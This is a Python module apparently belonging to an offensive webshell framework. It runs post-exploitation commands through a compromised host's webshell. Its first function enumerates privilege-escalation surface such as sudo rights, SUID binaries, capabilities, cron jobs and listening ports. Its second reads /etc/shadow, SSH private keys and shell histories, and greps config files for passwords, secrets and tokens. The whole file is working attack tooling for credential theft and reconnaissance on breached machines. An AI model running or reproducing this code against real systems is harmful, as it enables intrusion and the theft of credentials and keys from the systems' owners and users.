"""Aggregate post-exploitation enumeration and credential harvesting.

Orchestrates the one-off commands an operator would otherwise type by hand
(privesc surface) and sweeps common credential locations — returning structured
data so the REPL/CLI/batch can render or store it.
"""

from __future__ import annotations

import shlex

from ..core.webshell import WebShell
from ..exceptions import WebshellError

# (label, command) — privilege-escalation enumeration surface.
_CHECKS: list[tuple[str, str]] = [
    ("whoami", "id"),
    ("sudo", "sudo -n -l 2>/dev/null"),
    ("kernel", "uname -a"),
    ("cron", "cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null"),
    ("capabilities", "getcap -r / 2>/dev/null"),
    ("world_writable", "find / -xdev -type f -perm -0002 2>/dev/null | head -n 50"),
    ("suid", "find / -xdev -perm -4000 -type f 2>/dev/null"),
    ("listening", "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"),
    ("env", "env"),
]

_CRED_FILES = [
    "/etc/passwd",
    "/etc/shadow",
    "~/.bash_history",
    "~/.mysql_history",
    "~/.ssh/id_rsa",
    "~/.ssh/id_ed25519",
    "~/.ssh/authorized_keys",
]


def enumerate_target(ws: WebShell) -> dict[str, str]:
    """Run the privesc enumeration checks, returning ``{label: output}``."""
    results: dict[str, str] = {}
    for label, command in _CHECKS:
        try:
            results[label] = ws.run_command(command).strip()
        except WebshellError as exc:
            results[label] = f"<error: {exc}>"
    return results


def harvest_credentials(ws: WebShell, config_files: list[str] | None = None) -> dict[str, str]:
    """Read common credential files and grep DB creds out of config files."""
    found: dict[str, str] = {}
    for path in _CRED_FILES:
        out = ws.run_command(f"cat {path} 2>/dev/null").strip()
        if out:
            found[path] = out
    for config in config_files or []:
        out = ws.run_command(
            f"grep -iE 'pass|pwd|user|db_|secret|token' {shlex.quote(config)} 2>/dev/null"
        ).strip()
        if out:
            found[config] = out
    return found
